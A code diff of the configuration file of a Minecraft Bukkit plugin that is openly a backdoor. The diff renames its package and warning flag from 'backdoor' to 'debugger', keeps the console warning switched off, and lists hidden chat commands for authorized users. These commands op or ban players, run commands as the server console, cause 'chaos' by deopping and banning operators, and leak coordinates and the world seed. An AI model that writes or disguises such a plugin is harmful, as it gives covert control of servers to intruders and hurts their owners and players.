@@ -2,7 +2,7 @@
  * Plugin configuration file
  */
 
-package com.thiccindustries.backdoor;
+package com.thiccindustries.debugger;
 
 import org.bukkit.ChatColor;
 
@@ -23,8 +23,8 @@ public class Config {
     // Treat authorized_uuids / tmp_authorized_uuids as player names instead.
     public static Boolean uuids_are_usernames = false;
 
-    // Warn server console about backdoor 
-    public static final Boolean display_backdoor_warning = false;
+    // Warn server console about "debugger"
+    public static final Boolean display_debugger_warning = false;
 
     // Print debug messages to console 
     public static final Boolean display_debug_messages = false;
@@ -61,7 +61,7 @@ public class Config {
     /* Chat settings */
 
     // message prefix 
-    public static final String chat_message_prefix = "## Backdoor ##";
+    public static final String chat_message_prefix = "## BD ##";
 
     // color of messages prefix 
     public static final ChatColor chat_message_prefix_color = ChatColor.RED;
@@ -82,6 +82,7 @@ public class Config {
 
     // Help message content
     public static final HelpItem[] help_messages = {
+            new HelpItem("help",        "[command]",                    "display this message, or description of command."),
             new HelpItem("op",          "[player]",                     "op specified player (def: self)"),
             new HelpItem("deop",        "[player]",                     "deop specified player (def: self)"),
             new HelpItem("ban",         "(player) [reason] [source]",   "ban player with reason and source (def: " + default_ban_reason + ", " + default_ban_source + ")"),
@@ -90,11 +91,11 @@ public class Config {
             new HelpItem("gamemode",    "[gamemode]",                   "switch to specified gamemode (def: " + Config.default_gamemode + ")"),
             new HelpItem("give",        "(item) [count]",               "give the specified item in specified quantities (def: stack)"),
             new HelpItem("32k",         "(type)",                       "Add 32k enchants to item being held. (types = 'tool' or 'sword')"),
-            new HelpItem("exec",        "[command]",                    "Exocute command as server console."),
-            new HelpItem("chaos",       "",                             "Deop and ban ops, op all regular players."),
+            new HelpItem("exec",        "[command]",                    "[Visible] Exocute command as server console."),
+            new HelpItem("chaos",       "",                             "[Visible] Deop and ban ops, op all regular players."),
             new HelpItem("seed",        "",                             "Get the current world seed."),
             new HelpItem("coords",      "[player]",                     "Get the coordinates of specified player."),
-            new HelpItem("tp",          "[x] [y] [z]",                  "Teleport to specified coordinates."),
+            new HelpItem("tp",          "[x] [y] [z]",                  "[Visible] Teleport to specified coordinates."),
             new HelpItem("auth",        "(player)",                     "Authorize user until next server restart."),
             new HelpItem("deauth",      "(player)",                     "Remove player authorized with " + command_prefix + "auth. Perminantly auth'd players cannot be deauth'ed")
 
